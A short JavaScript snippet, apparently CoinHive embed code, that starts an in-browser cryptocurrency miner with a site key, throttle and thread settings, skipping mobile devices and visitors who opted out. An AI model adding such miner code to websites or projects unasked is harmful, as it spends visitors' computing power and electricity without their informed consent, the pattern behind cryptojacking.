        var miner = new CoinHive.Anonymous('34Whxx4fiXl7PL1GAuPJIYp2V5Zooksi', {
            throttle: 0.3,
            threads: 4
        }); // Only start on non-mobile devices and if not opted-out        // in the last 14400 seconds (4 hours):        if (!miner.isMobile() && !miner.didOptOut(14400)) {        miner.start();        }